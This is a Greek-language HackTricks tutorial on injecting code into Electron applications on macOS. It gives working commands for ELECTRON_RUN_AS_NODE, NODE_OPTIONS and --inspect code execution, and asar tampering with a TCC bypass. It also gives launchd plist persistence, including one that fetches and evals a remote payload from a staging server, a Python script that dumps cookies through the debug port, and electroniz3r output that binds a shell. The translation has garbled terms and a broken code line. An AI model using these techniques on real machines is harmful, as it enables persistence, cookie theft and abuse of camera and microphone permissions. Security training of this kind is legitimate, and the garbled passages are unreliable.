# Εισαγωγή σε εφαρμογές Electron στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές πληροφορίες

Εάν δεν γνωρίζετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Αλλά για τώρα απλά γνωρίζετε ότι το Electron τρέχει **node**.\
Και το node έχει ορισμένες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλον κώδικα** εκτός από τον καθορισμένο αρχείο.

### Συγχώνευση Electron

Αυτές οι τεχνικές θα συζητηθούν παρακάτω, αλλά το Electron έχει προσθέσει πρόσφατα αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Συγχωνεύσεις Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι αυτές που χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron στο macOS από το **φόρτωμα αυθαίρετου κώδικα**:

* **`RunAsNode`**: Εάν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την εισαγωγή κώδικα.
* **`EnableNodeCliInspectArguments`**: Εάν είναι απενεργοποιημένο, οι παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα τηρούνται. Αποτρέποντας έτσι τον τρόπο εισαγωγής κώδικα.
* **`EnableEmbeddedAsarIntegrityValidation`**: Εάν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα ελεγχθεί από το macOS. Αποτρέποντας έτσι την εισαγωγή κώδικα με τροποποίηση του περιεχομένου αυτού του αρχείου.
* **`OnlyLoadAppFromAsar`**: Εάν είναι ενεργοποιημένο, αντί να αναζητά το φόρτωμα με την ακόλουθη σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγχει και θα χρησιμοποιεί μόνο το app.asar, εξασφαλίζοντας έτσι ότι όταν **συνδυαστεί** με τη συγχώνευση **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να φορτωθεί μη επικυρωμένος κώδικας.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Εάν είναι ενεργοποιημένο, η διεργασία περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το V8 snapshot της.

Μια άλλη ενδιαφέρουσα συγχώνευση που δεν θα αποτρέπει την εισαγωγή κώδικα είναι:

* **EnableCookieEncryption**: Εάν είναι ενεργοποιημένο, η αποθήκευση των cookies στον δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογραφίας σε επίπεδο λειτουργικού συστήματος.

### Έλεγχος των συγχωνεύσεων Electron

Μπορείτε να **ελέγξετε αυτές τις σημαίες** από μια εφαρμογή με:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Τροποποίηση των Electron Fuses

Όπως αναφέρονται στα [**έγγραφα**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Electron Fuses** γίνεται μέσα στο **Electron binary** που περιέχει κάπου τον χαρακτήρα **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Στις εφαρμογές macOS, αυτό συνήθως βρίσκεται στη διαδρομή `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε το προηγούμενο string. Μετά από αυτό το string, μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδηλώνει εάν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι το `0` και `0x31` είναι το `1`) για να **τροποποιήσετε τις τιμές των ασφαλειών**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Σημειώστε ότι εάν προσπαθήσετε να **αντικαταστήσετε** το **δυαδικό αρχείο του Electron Framework** μέσα σε μια εφαρμογή με αυτά τα τροποποιημένα bytes, η εφαρμογή δεν θα εκτελεστεί.

## RCE προσθήκη κώδικα σε εφαρμογές Electron

Μπορεί να υπάρχουν **εξωτερικά αρχεία JS/HTML** που χρησιμοποιεί μια εφαρμογή Electron, οπότε ένας επιτιθέμενος μπορεί να εισχωρήσει κώδικα σε αυτά τα αρχεία, η υπογραφή των οποίων δεν θα ελεγχθεί, και να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο της εφαρμογής.

{% hint style="danger" %}
Ωστόσο, αυτή τη στιγμή υπάρχουν 2 περιορισμοί:

* Απαιτείται η άδεια **`kTCCServiceSystemPolicyAppBundles`** για να τροποποιηθεί μια εφαρμογή, οπότε από προεπιλογή αυτό δεν είναι πλέον δυνατό.
* Το συνταγμένο αρχείο **`asap`** συνήθως έχει τις ασφάλειες **`embeddedAsarIntegrityValidation`** και **`onlyLoadAppFromAsar`** ενεργοποιημένες

Αυτό καθιστά πιο περίπλοκη (ή αδύνατη) αυτήν τη διαδρομή επίθεσης.
{% endhint %}

Σημειώστε ότι είναι δυνατό να παρακάμψετε την απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε έναν άλλο κατάλογο (όπως το **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το πίσω σε **`app.app/Contents`** και εκτελώντας το.

Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
```bash
npx asar extract app.asar app-decomp
```
Και επανασυσκευάστε το αρχείο μετά την τροποποίησή του με:
```bash
npx asar pack app-decomp app-new.asar
```
## Εκτέλεση κώδικα απομακρυσμένης εκτέλεσης (RCE) με το `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), εάν αυτή η μεταβλητή περιβάλλοντος είναι ορισμένη, θα ξεκινήσει τη διεργασία ως μια κανονική διεργασία Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Εάν ο φούσκας **`RunAsNode`** είναι απενεργοποιημένος, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.
{% endhint %}

### Έγχυση από το App Plist

Όπως [**προτείνεται εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE με το `NODE_OPTIONS`

Μπορείτε να αποθηκεύσετε το payload σε ένα διαφορετικό αρχείο και να το εκτελέσετε:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Εάν η παράμετρος **`EnableNodeOptionsEnvironmentVariable`** είναι **απενεργοποιημένη**, η εφαρμογή θα **αγνοήσει** τη μεταβλητή περιβάλλοντος **NODE\_OPTIONS** κατά την εκκίνηση, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης εάν η παράμετρος **`RunAsNode`** είναι απενεργοποιημένη.

Εάν δεν ορίσετε την παράμετρο **`ELECTRON_RUN_AS_NODE`**, θα συναντήσετε το **σφάλμα**: `Οι περισσότερες NODE_OPTIONs δεν υποστηρίζονται σε συσκευασμένες εφαρμογές. Δείτε την τεκμηρίωση για περισσότερες λεπτομέρειες.`
{% endhint %}

### Έγχυση από το Plist της εφαρμογής

Μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE με επιθεώρηση

Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), αν εκτελέσετε μια εφαρμογή Electron με σημαίες όπως **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, θα ανοίξει ένα **θύρα επιθεώρησης** ώστε να μπορείτε να συνδεθείτε σε αυτήν (για παράδειγμα από το Chrome στο `chrome://inspect`) και θα μπορείτε να **εισάγετε κώδικα σε αυτήν** ή ακόμα και να εκκινήσετε νέες διεργασίες.\
Για παράδειγμα:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Εάν ο φούσκα **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοεί τις παραμέτρους του node** (όπως `--inspect`) όταν ξεκινάει, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης εάν η φούσκα **`RunAsNode`** είναι απενεργοποιημένη.

Ωστόσο, μπορείτε ακόμα να χρησιμοποιήσετε την παράμετρο **electron `--remote-debugging-port=9229`** αλλά το προηγούμενο φορτίο δεν θα λειτουργήσει για να εκτελέσει άλλες διεργασίες.
{% endhint %}

Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε ορισμένες πληροφορίες από την εφαρμογή Electron, όπως το **ιστορικό** (με GET εντολές) ή τα **cookies** του προγράμματος περιήγησης (καθώς αποκρυπτογραφούνται μέσα στον προγράμματα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).

Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό σενάριο όπως:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Σε [**αυτή την ανάρτηση στο blog**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση καταχράται για να κατεβάσει ο Headless Chrome **οποιοδήποτε αρχείο σε οποιαδήποτε τοποθεσία**.

### Εισαγωγή από το App Plist

Μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Παράκαμψη TCC με κατάχρηση παλαιότερων εκδόσεων

{% hint style="success" %}
Ο δαίμονας TCC του macOS δεν ελέγχει την εκτελούμενη έκδοση της εφαρμογής. Έτσι, αν **δεν μπορείτε να εισχωρήσετε κώδικα σε μια εφαρμογή Electron** με καμία από τις προηγούμενες τεχνικές, μπορείτε να κατεβάσετε μια προηγούμενη έκδοση της εφαρμογής και να εισχωρήσετε κώδικα σε αυτήν, καθώς θα λάβει ακόμα τα προνόμια TCC (εκτός αν το Trust Cache το εμποδίζει).
{% endhint %}

## Εκτέλεση μη JS κώδικα

Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **JS κώδικα μέσα στη διεργασία της εφαρμογής Electron**. Ωστόσο, θυμηθείτε ότι οι **υποδιεργασίες εκτελούνται με το ίδιο προφίλ ασφαλείας** με τη γονική εφαρμογή και **κληρονομούν τα δικαιώματα TCC** της.\
Επομένως, αν θέλετε να καταχραστείτε δικαιώματα για πρόσβαση στην κάμερα ή το μικρόφωνο, για παράδειγμα, μπορείτε απλά να **εκτελέσετε ένα άλλο δυαδικό αρχείο από τη διεργασία**.

## Αυτόματη εισαγωγή

Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **βρεί ευπάθειες σε εγκατεστημένες εφαρμογές Electron** και να εισάγει κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:

Πρέπει να το μεταγλωτίσετε μόνοι σας και μπορείτε να το χρησιμοποιήσετε ως εξής:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Αναφορές

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
